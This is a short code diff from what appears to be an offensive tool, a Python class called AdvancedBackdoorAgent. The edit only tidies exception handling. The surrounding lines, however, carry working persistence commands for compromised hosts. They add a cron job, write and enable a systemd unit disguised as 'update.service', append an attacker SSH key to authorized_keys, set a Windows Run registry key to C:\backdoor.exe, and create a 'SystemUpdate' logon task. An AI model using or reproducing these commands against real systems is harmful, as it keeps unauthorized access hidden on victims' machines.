@@ -314,7 +314,7 @@ class AdvancedBackdoorAgent(BaseAgent):
             command = f"(crontab -l 2>/dev/null; echo '{cron_entry}') | crontab -"
             result = await self._execute_command(command, shell_access)
             return result.get("success", False)
-        except:
+        except Exception as e:
             return False
     
     async def _add_systemd_persistence(self, shell_access: Dict) -> bool:
@@ -332,7 +332,7 @@ class AdvancedBackdoorAgent(BaseAgent):
             command = f"echo '{service_content}' > /etc/systemd/system/update.service && systemctl enable update.service"
             result = await self._execute_command(command, shell_access)
             return result.get("success", False)
-        except:
+        except Exception as e:
             return False
     
     async def _add_ssh_key_persistence(self, shell_access: Dict) -> bool:
@@ -342,7 +342,7 @@ class AdvancedBackdoorAgent(BaseAgent):
             command = f"mkdir -p ~/.ssh && echo '{ssh_key}' >> ~/.ssh/authorized_keys"
             result = await self._execute_command(command, shell_access)
             return result.get("success", False)
-        except:
+        except Exception as e:
             return False
     
     async def _add_registry_persistence(self, shell_access: Dict) -> bool:
@@ -351,7 +351,7 @@ class AdvancedBackdoorAgent(BaseAgent):
             command = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "C:\\backdoor.exe" /f'
             result = await self._execute_command(command, shell_access)
             return result.get("success", False)
-        except:
+        except Exception as e:
             return False
     
     async def _add_scheduled_task_persistence(self, shell_access: Dict) -> bool:
@@ -360,7 +360,7 @@ class AdvancedBackdoorAgent(BaseAgent):
             command = 'schtasks /create /tn "SystemUpdate" /tr "C:\\backdoor.exe" /sc onlogon /f'
             result = await self._execute_command(command, shell_access)
             return result.get("success", False)
-        except:
+        except Exception as e:
             return False
     
     def _generate_random_filename(self, extension: str) -> str:
